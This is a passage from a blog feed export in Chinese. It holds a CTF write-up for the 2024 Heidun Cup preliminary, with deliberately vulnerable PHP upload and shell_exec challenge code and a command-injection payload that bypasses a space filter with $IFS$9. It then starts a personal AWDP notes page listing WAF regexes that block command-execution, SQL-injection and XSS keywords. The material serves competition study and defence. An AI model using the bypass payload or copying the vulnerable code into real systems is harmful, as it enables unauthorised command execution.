class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^(\w|\:|\$|\.|\&lt;|\>)]/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$cleanFilename</span><span class="token operator">=</span><span class="token function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tempfile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">get_extension</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// null</span><span class="token comment">//$ext = str_ireplace('::$DATA', '', $ext);//ȥ���ַ���::$DATA</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php3'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php2'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htm'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'phtml'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pht'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exe'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bat'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tempfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z0-9]/is"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I don't want to see characters!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'asp'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'asa'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cer'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cdx'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'aspx'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">)</span> <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">;</span><span class="token variable">$savefile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span><span class="token operator">.</span><span class="token variable">$cleanFilename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tempfile</span><span class="token punctuation">,</span><span class="token variable">$savefile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success upload..path :'</span><span class="token operator">.</span><span class="token variable">$savefile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Upload failed..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_extension</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$dotPosition</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dotPosition</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$dotPosition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$cleanFilename</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token variable">$cleanFilename</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Desktop下找到一个bak文件夹，demo03下有go源码，下载Desktop的bak.zip，居然是gogogo的源码！nm我还在想这是不是这题的flag，浪费了很久</p><p>flag翻了半天在C:&#x2F;Windows&#x2F;flag.txt</p><hr><h2 id="PDF-export（Unsolved）"><a href="#PDF-export（Unsolved）" class="headerlink" title="PDF export（Unsolved）"></a>PDF export（Unsolved）</h2><p>好像不是WeasyPrint，java起的服务，没啥头绪，输入的值会直接变成pdf的内容</p><hr><h2 id="你懂Fu22吗？"><a href="#你懂Fu22吗？" class="headerlink" title="你懂Fu22吗？"></a>你懂Fu22吗？</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">字典越长你越强<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入题目，回显<code>Do you have only one method?</code></p><p>用post随便传个参数，回显<code>A pair of arguments is required, like key=value</code></p><p>那就爆破参数，找个字典爆破一下：<a href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict">https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict</a></p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622172937111.png" alt="image-20240622172937111"></p><p>爆出一个参数 word，回显<code>Congratulations on finding the correct key, continue to detect value</code></p><p>还得继续加字典爆，爆出来参数值为 exec，回显<code>Congratulations on finding the right value!!!!!!!!!! Kjhsf10fds.php</code></p><p>访问 Kjhsf10fds.php，回显<code>A pair of arguments is required, like key=value</code></p><p>又得爆破。。爆出来参数名为 key，回显<code>What you want to do, just look for the flag!</code></p><p>测试发现会命令执行，过滤了空格，测试可以用<code>$IFS$9</code>绕过</p><p>于是rce</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>Kjhsf10fds<span class="token operator">.</span>php<span class="token operator">?</span>key<span class="token operator">=</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">/</span>www<span class="token operator">/</span>admin<span class="token operator">/</span>flag<span class="token operator">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在&#x2F;www&#x2F;admin&#x2F;flag.txt：<code>flag&#123;lkjsdfnkelddfj_jkelk&#125;</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$imagePath</span><span class="token operator">=</span><span class="token string single-quoted-string">'jiuzhe.jpg'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="'</span><span class="token operator">.</span><span class="token variable">$imagePath</span><span class="token operator">.</span><span class="token string single-quoted-string">'" alt="My Image">'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'word'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'word'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token variable">$cmd</span><span class="token operator">!=</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Congratulations on finding the correct key, continue to detect value'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token variable">$cmd</span><span class="token operator">==</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Congratulations on finding the right value!!!!!!!!!!\nKjhsf10fds.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token string single-quoted-string">'A pair of arguments is required, like key=value'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Do you have only one method?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Kjhsf10fds.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function-definition function">executeSafeCommand</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 定义一个包含不允许的字符的数组  </span>    <span class="token variable">$disallowedCharsPattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[\\\\;|&amp;`\'&#123;&#125;>&lt;\s\r\n\t\f]/'</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$disallowedCharsPattern</span><span class="token punctuation">,</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 执行命令并获取输出  </span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 返回命令输出或进行其他处理  </span>    <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'method not allow'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"What you want to do, just look for the flag!\n"</span><span class="token punctuation">;</span>     <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">executeSafeCommand</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token string single-quoted-string">'A pair of arguments is required, like key=value'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到题-学会SM"><a href="#签到题-学会SM" class="headerlink" title="签到题-学会SM"></a>签到题-学会SM</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">我国的商用密码（国密）中有一种杂凑算法(也叫哈希算法)，请用该算法对字符串“heidun2024”进行运算，将结果(小写十六进制值)作为本题答案。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SM3加密不需要密钥</p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622093453517.png" alt="image-20240622093453517"></p><hr><h2 id="源码和数据都要保护（Unsolved）"><a href="#源码和数据都要保护（Unsolved）" class="headerlink" title="源码和数据都要保护（Unsolved）"></a>源码和数据都要保护（Unsolved）</h2><p>测试发现是beast加密</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span> <span class="token function-definition function">my_encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$re</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">%</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token variable">$num</span><span class="token operator">-=</span><span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$re</span><span class="token operator">.=</span><span class="token operator">...</span><span class="token operator">...</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="我的进制我做主（Unsolved）"><a href="#我的进制我做主（Unsolved）" class="headerlink" title="我的进制我做主（Unsolved）"></a>我的进制我做主（Unsolved）</h2><p>问gpt说是十八进制，但是我没做出来！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;鉴定为找flag大赛&lt;/p&gt;
&lt;p&gt;第二年了还是进不去线下，只靠自己真是一点也打不穿啊。。&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf&quot;&gt;https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;合着全是543出的是吧&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>AWDP个人知识库</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/21/AWDP%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/21/AWDP%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/</id>
    <published>2024-06-20T17:36:32.000Z</published>
    <updated>2024-07-08T17:42:31.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/06/01/awd/">https://fushuling.com/index.php/2023/06/01/awd/</a></p><p><a href="https://5ime.cn/awdp.html#nexmoe-content">https://5ime.cn/awdp.html#nexmoe-content</a></p><p><a href="https://hackerpoet.com/index.php/archives/988/">https://hackerpoet.com/index.php/archives/988/</a></p><span id="more"></span><hr><h1 id="Waf"><a href="#Waf" class="headerlink" title="Waf"></a>Waf</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafrce</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/passthru|system|tail|flag|exec|base64/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafsqli</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|&lt;|;|\"|\'|\^|\|/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafxss</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|http|\"|\`|cookie|&lt;|>|script/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'home.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token 